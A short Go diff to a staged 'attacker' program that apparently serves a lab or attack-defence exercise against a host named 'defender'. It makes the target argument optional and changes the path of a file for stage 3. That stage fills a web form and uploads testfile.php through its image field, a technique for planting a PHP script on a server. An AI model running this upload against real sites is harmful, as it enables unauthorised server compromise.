@@ -8,7 +8,7 @@ import (
 )
 
 var stage = ""
-var target = ""
+var target = "http://defender"
 
 func debug(format string, arg ...interface{}) {
 	if os.Getenv("DEBUG") == "1" {
@@ -17,11 +17,13 @@ func debug(format string, arg ...interface{}) {
 }
 
 func main() {
-	if len(os.Args) < 3 {
-		panic("Usage: attacker [STAGE_NR] [TARGET_HOST]")
+	if len(os.Args) < 2 {
+		panic("Usage: attacker [STAGE_NR] ([TARGET_HOST])")
 	}
 	stage = os.Args[1]
-	target = os.Args[2]
+	if len(os.Args) >= 3 {
+		target = os.Args[2]
+	}
 	var err error
 
 	switch stage {
@@ -123,8 +125,7 @@ func runStage3() error {
 	loginForm, _ := bow.Form("[id='main']")
 	loginForm.Input("name", "Visitor")
 	loginForm.Input("message", "かわいい犬ですね！")
-	wd, _ := os.Getwd()
-	file, _ := os.Open(wd + "/testfile.php")
+	file, _ := os.Open("/usr/local/testfile.php")
 	loginForm.File("image", "testfile.php", file)
 	if err := loginForm.Submit(); err != nil {
 		return err
